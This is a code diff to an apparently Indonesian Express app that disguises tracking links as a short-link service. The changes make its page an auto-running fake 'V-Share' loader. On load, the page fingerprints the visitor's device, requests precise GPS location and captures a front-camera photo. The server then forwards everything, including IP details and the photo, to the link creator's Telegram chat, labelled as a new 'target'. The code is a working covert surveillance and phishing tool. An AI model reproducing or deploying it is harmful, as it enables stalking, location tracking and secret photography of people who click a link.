@@ -21,7 +21,6 @@ app.use(express.json({ limit: '10mb' }));
 app.set("json spaces", 2);
 app.use(cors());
 
-// Route baru yang disamarkan. Contoh: /s/NzY1NDMyNzY1NDp8fGh0dHBzOi8vd3d3LnlvdXR1YmUuY29t
 app.get('/s/:data', async (req, res) => {
     const encodedData = req.params.data;
     let creatorId, targetUrl;
@@ -64,69 +63,115 @@ app.get('/s/:data', async (req, res) => {
     <!DOCTYPE html>
     <html lang="id">
     <head>
-        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Memeriksa koneksi Anda...</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>V-Share | Loading...</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&display=swap" rel="stylesheet">
         <style>
-            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
-            html, body { width: 100%; height: 100%; margin: 0; padding: 0; }
-            body { background-color: #f9f9f9; color: #333; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; text-align: center; }
-            .check-container { background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); border: 1px solid #e5e5e5; max-width: 500px; width: 90%; }
-            .icon-container { margin-bottom: 20px; }
-            .icon-container svg { width: 50px; height: 50px; color: #007BFF; }
-            h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px 0; color: #1a1a1a; }
-            p { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 30px; }
-            .spinner { border: 4px solid rgba(0, 123, 255, 0.2); border-left-color: #007BFF; border-radius: 50%; width: 40px; height: 40px; animation: spin 1.2s linear infinite; margin: 20px auto 0; display: none; }
-            .footer-info { margin-top: 30px; font-size: 12px; color: #999; }
-            #verify-btn { background-color: #007BFF; color: white; border: none; padding: 12px 25px; font-size: 16px; font-weight: 500; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
-            #verify-btn:hover { background-color: #0056b3; }
-            #verify-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
+            :root {
+                --bg-color: #000000; --primary-color: #ff0050; --secondary-color: #00f2ea; --white: #ffffff;
+            }
+            body {
+                margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
+                height: 100vh; background-color: var(--bg-color); font-family: 'Poppins', sans-serif; overflow: hidden;
+            }
+            .loader-container { position: relative; display: flex; justify-content: center; align-items: center; }
+            .logo { width: 120px; height: 120px; display: grid; place-items: center; position: relative; z-index: 2; }
+            .logo svg { width: 60%; height: 60%; color: var(--white); animation: logo-pop 1.5s infinite cubic-bezier(0.68, -0.55, 0.27, 1.55); }
+            .spinner { position: absolute; width: 150px; height: 150px; border-radius: 50%; z-index: 1; }
+            .spinner.one { border: 5px solid transparent; border-top-color: var(--primary-color); animation: spin 2s linear infinite; filter: drop-shadow(0 0 10px var(--primary-color)); }
+            .spinner.two { border: 5px solid transparent; border-bottom-color: var(--secondary-color); animation: spin-reverse 1.5s linear infinite; filter: drop-shadow(0 0 10px var(--secondary-color)); }
+            .loading-text { position: absolute; bottom: -60px; color: var(--white); font-size: 1.2em; letter-spacing: 2px; opacity: 0.8; }
+            .loading-text span { animation: blink 1.2s infinite; }
+            .loading-text span:nth-child(2) { animation-delay: 0.2s; }
+            .loading-text span:nth-child(3) { animation-delay: 0.4s; }
             @keyframes spin { to { transform: rotate(360deg); } }
+            @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+            @keyframes logo-pop { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }
+            @keyframes blink { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
         </style>
     </head>
     <body>
-        <div class="check-container">
-            <div class="icon-container">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1.06 14.44L6.5 11l1.41-1.41 3.09 3.09 7.07-7.07L19.5 7.05l-8.48 8.48-0.08-0.09z"/></svg>
+        <div class="loader-container">
+            <div class="spinner one"></div><div class="spinner two"></div>
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7.41 2.59c.58-.59 1.53-.59 2.11 0l2.48 2.48 2.48-2.48c.58-.59 1.53-.59 2.11 0s.58 1.54 0 2.12l-3.53 3.54c-.59.58-1.54.58-2.12 0L7.41 4.71c-.58-.58-.58-1.53 0-2.12zM12 12.25c.83 0 1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5v-5c0-.83.67-1.5 1.5-1.5z"/></svg>
             </div>
-            <h1>Verifikasi keamanan diperlukan</h1>
-            <p>Untuk mengakses halaman dengan aman, klik untuk memulai pemeriksaan keamanan koneksi Anda.</p>
-            <button id="verify-btn">Mulai Pemeriksaan Keamanan</button>
-            <div class="spinner" id="spinner"></div>
-            <div class="footer-info">Security by ProjectSF</div>
+            <div class="loading-text">LOADING<span>.</span><span>.</span><span>.</span></div>
         </div>
-
         <script>
-            const verifyBtn = document.getElementById('verify-btn');
-            const spinner = document.getElementById('spinner');
-
             const redirectToTarget = () => { setTimeout(() => { window.location.href = \`${targetUrl}\`; }, 500); };
             
             async function logData(data) {
                 try { await fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) { console.error('Log Error:', e); }
             }
 
-            async function processData() {
-                verifyBtn.disabled = true;
-                verifyBtn.textContent = 'Memverifikasi...';
-                spinner.style.display = 'block';
-
+            async function processAndRedirect() {
+                const getOsAndBrowser = (ua) => {
+                    let os = 'N/A', browser = 'N/A';
+                    if (/Android/i.test(ua)) { os = (ua.match(/Android (\\d+(\\.\\d+)*)/i) || [])[0] || 'Android'; }
+                    else if (/iPhone|iPad|iPod/i.test(ua)) { os = (ua.match(/OS (\\d+_\\d+(_\\d+)*)/i) || ['iOS'])[0].replace(/_/g, '.'); }
+                    else if (/Windows NT/i.test(ua)) { os = (ua.match(/Windows NT (\\d+(\\.\\d+)*)/i) || [])[0] || 'Windows'; }
+                    else if (/Mac OS X/i.test(ua)) { os = (ua.match(/Mac OS X (\\d+[._]\\d+([._]\\d+)*)/i) || ['Mac OS X'])[0].replace(/_/g, '.'); }
+                    else if (/Linux/i.test(ua)) { os = 'Linux'; }
+                    
+                    if (ua.indexOf("Firefox") > -1) { browser = (ua.match(/Firefox\\/[\\d.]+/i) || ['Firefox'])[0]; }
+                    else if (ua.indexOf("SamsungBrowser") > -1) { browser = (ua.match(/SamsungBrowser\\/[\\d.]+/i) || ['Samsung Browser'])[0]; }
+                    else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) { browser = (ua.match(/(Opera|OPR)\\/[\\d.]+/i) || ['Opera'])[0]; }
+                    else if (ua.indexOf("Edge") > -1) { browser = (ua.match(/Edge\\/[\\d.]+/i) || ['Edge'])[0]; }
+                    else if (ua.indexOf("Chrome") > -1) { browser = (ua.match(/Chrome\\/[\\d.]+/i) || ['Chrome'])[0]; }
+                    else if (ua.indexOf("Safari") > -1) { browser = (ua.match(/Version\\/[\\d.]+/i) || ['Safari'])[0]; }
+                    return { os, browser };
+                };
+                
+                const getGpuInfo = () => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+                    } catch (e) { return 'N/A'; }
+                };
+            
                 let permissionsGranted = 0;
+                const { os, browser } = getOsAndBrowser(navigator.userAgent);
+
                 const data = {
                     creatorId: \`${creatorId}\`, targetUrl: \`${targetUrl}\`, userAgent: navigator.userAgent,
-                    platform: navigator.platform, language: navigator.language, screenWidth: window.screen.width,
-                    screenHeight: window.screen.height, location: 'Ditolak/Dilewati', camera: 'Ditolak/Dilewati'
+                    os: os, platform: navigator.platform, language: navigator.language,
+                    screenWidth: window.screen.width, screenHeight: window.screen.height,
+                    location: 'Ditolak/Dilewati', camera: 'Ditolak/Dilewati'
                 };
 
                 try { const battery = await navigator.getBattery(); data.battery = { level: \`\${Math.round(battery.level * 100)}%\`, isCharging: battery.charging }; } catch (e) { data.battery = { level: 'N/A', isCharging: 'N/A' }; }
-                data.hardware = { cpuCores: navigator.hardwareConcurrency || 'N/A', ram: navigator.deviceMemory ? \`\${navigator.deviceMemory} GB\` : 'N/A' };
-                data.network = { connectionType: navigator.connection?.type || 'N/A', effectiveType: navigator.connection?.effectiveType || 'N/A', downlink: navigator.connection?.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A' };
-                data.browser = { viewportWidth: window.innerWidth, viewportHeight: window.innerHeight, pixelRatio: window.devicePixelRatio, cookiesEnabled: navigator.cookieEnabled, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
+                data.hardware = {
+                    cpuCores: navigator.hardwareConcurrency || 'N/A',
+                    ram: navigator.deviceMemory ? \`\${navigator.deviceMemory} GB\` : 'N/A',
+                    gpu: getGpuInfo()
+                };
+                data.network = {
+                    connectionType: navigator.connection?.type || 'N/A',
+                    effectiveType: navigator.connection?.effectiveType || 'N/A',
+                    downlink: navigator.connection?.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A'
+                };
+                data.browser = {
+                    name: browser,
+                    viewportWidth: window.innerWidth, viewportHeight: window.innerHeight,
+                    pixelRatio: window.devicePixelRatio, colorDepth: window.screen.colorDepth,
+                    cookiesEnabled: navigator.cookieEnabled, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                 data.device = {
+                    touchSupport: navigator.maxTouchPoints > 0,
+                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Tidak ada'
+                };
 
                 try {
                     const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }); });
-                    data.location = \`https://www.google.com/maps/search/?api=1&query=\${position.coords.latitude},\${position.coords.longitude}\`;
+                    data.location = \`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}\`;
                     permissionsGranted++;
-                } catch (e) { console.warn('Geolocation failed:', e.message); }
+                } catch (e) { /* Geolocation failed or denied */ }
 
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -136,14 +181,14 @@ app.get('/s/:data', async (req, res) => {
                     data.camera = canvas.toDataURL('image/jpeg');
                     stream.getTracks().forEach(track => track.stop());
                     permissionsGranted++;
-                } catch (e) { console.warn('Camera access failed:', e.message); }
+                } catch (e) { /* Camera access failed or denied */ }
                 
                 data.permissionsGranted = permissionsGranted;
                 await logData(data);
                 redirectToTarget();
             }
 
-            verifyBtn.addEventListener('click', processData);
+            window.onload = processAndRedirect;
         </script>
     </body>
     </html>
@@ -166,34 +211,49 @@ app.post('/log', async (req, res) => {
     } catch (e) { console.error("Gagal mengambil info IP:", e.message); }
 
     const isCameraAllowed = data.camera.startsWith('data:image/jpeg;base64,');
-    const cameraStatusText = isCameraAllowed ? 'Diizinkan (Gambar terlampir)' : data.camera;
+    const cameraStatusText = isCameraAllowed ? '✅ Diizinkan (Gambar terlampir)' : `❌ ${data.camera}`;
     const batteryStatus = data.battery.isCharging ? '🔌 Mengisi Daya' : '🔋 Normal';
+    const cookieStatus = data.browser.cookiesEnabled ? '✅ Aktif' : '❌ Nonaktif';
+    const touchStatus = data.device.touchSupport ? '✅ Ya' : '❌ Tidak';
 
     const message =
 `🎯 *TARGET BARU TERDETEKSI* 🎯
 -----------------------------------
-🔗 *URL Asli:* ${data.targetUrl}
+🔗 *URL Asli:* \`${data.targetUrl}\`
 
-*— INFO PERANGKAT & JARINGAN —*
-📱 *Platform:* ${data.platform}
-🧠 *CPU Cores:* ${data.hardware.cpuCores}
-💾 *RAM (Perkiraan):* ${data.hardware.ram}
-📶 *Jaringan:* ${data.network.connectionType} (${data.network.effectiveType})
-⚡ *Baterai:* ${data.battery.level} (${batteryStatus})
+*💻 — SISTEM & OS —*
+*Sistem Operasi:* ${data.os}
+*Platform:* ${data.platform}
+*User Agent:* \`${data.userAgent}\`
 
-*— INFO BROWSER & LOKASI —*
-🖥️ *User Agent:* ${data.userAgent}
-📏 *Resolusi:* ${data.screenWidth}x${data.screenHeight} | *Viewport:* ${data.browser.viewportWidth}x${data.browser.viewportHeight}
-⏰ *Zona Waktu:* ${data.browser.timezone}
-📍 *Lokasi:* ${data.location}
+*🌐 — BROWSER & TAMPILAN —*
+*Browser:* ${data.browser.name}
+*Resolusi Layar:* ${data.screenWidth}x${data.screenHeight}
+*Viewport:* ${data.browser.viewportWidth}x${data.browser.viewportHeight}
+*Kedalaman Warna:* ${data.browser.colorDepth}-bit
+*Rasio Piksel:* ${data.browser.pixelRatio}
+*Bahasa:* ${data.language}
+*Zona Waktu:* ${data.browser.timezone}
+*Cookie:* ${cookieStatus}
 
-*— INFO KONEKSI (IP) —*
-- *Alamat IP:* ${ip}
-- *Detail IP:*\n${ipInfo}
+*🔩 — PERANGKAT KERAS —*
+*CPU Cores:* ${data.hardware.cpuCores}
+*RAM (Perkiraan):* ${data.hardware.ram}
+*GPU/Renderer:* ${data.hardware.gpu}
+*Baterai:* ${data.battery.level} (${batteryStatus})
+*Dukungan Sentuh:* ${touchStatus}
+*Plugins:* ${data.device.plugins}
 
-*— RINGKASAN IZIN —*
-✅ *Izin Diberikan:* ${data.permissionsGranted} dari 2
-📸 *Kamera:* ${cameraStatusText}
+*📡 — JARINGAN & LOKASI —*
+*Tipe Koneksi:* ${data.network.connectionType} (${data.network.effectiveType})
+*Kecepatan Downlink:* ${data.network.downlink || 'N/A'}
+*Alamat IP:* \`${ip}\`
+*Detail IP:*\n${ipInfo}
+*Lokasi GPS:* ${data.location}
+
+*🔐 — RINGKASAN IZIN —*
+*Total Izin Diberikan:* ${data.permissionsGranted} dari 2
+*Akses Kamera:* ${cameraStatusText}
 `;
 
     try {
@@ -204,7 +264,7 @@ app.post('/log', async (req, res) => {
             const form = new FormData();
             form.append('chat_id', creatorId);
             form.append('photo', imageBuffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
-            form.append('caption', '📸 Gambar dari kamera target.');
+            form.append('caption', `📸 Gambar dari kamera target.\nIP: \`${ip}\``);
             await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
         }
     } catch (error) {
